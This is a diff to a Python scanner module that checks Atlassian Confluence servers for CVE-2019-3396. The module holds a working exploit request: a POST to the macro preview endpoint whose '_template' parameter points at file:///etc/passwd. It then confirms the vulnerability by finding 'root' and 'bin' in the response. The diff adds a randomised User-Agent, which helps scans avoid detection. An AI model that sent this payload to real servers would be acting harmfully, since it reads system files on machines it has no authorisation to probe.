@@ -14,8 +14,8 @@ def UrlProcessing(url):
 
 PayloadPost='''{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}'''
 Payload="/rest/tinymce/1/macro/preview"
-def CVE_2019_3396(arg):
-    scheme, url, port = UrlProcessing(arg)
+def CVE_2019_3396(Url,RandomAgent):
+    scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
         port = 443
     elif port is None and scheme == 'http':
@@ -29,7 +29,7 @@ def CVE_2019_3396(arg):
         'Host':host,
         'Accept': 'text/plain, */*; q=0.01',
         'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
-        'User-Agent': 'Mozilla/5.0(compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
+        'User-Agent': RandomAgent,
         'X-Requested-With': 'XMLHttpRequest',
         'Accept-Encoding': 'gzip, deflate, br',
         'Content-Type': 'application/json; charset=utf-8',
@@ -45,7 +45,7 @@ def CVE_2019_3396(arg):
         con = resp.text
         code = resp.status_code
         if code==200 and con.lower().find('bin')!=-1 and con.lower().find('root')!=-1 :
-            vul = "{} 存在AtlassianConfluence路径穿越与命令执行漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, PayloadUrl,PayloadPost)
-            return(vul)
+            Medusa = "{} 存在AtlassianConfluence路径穿越与命令执行漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, PayloadUrl,PayloadPost)
+            return(Medusa)
     except Exception as e:
         pass
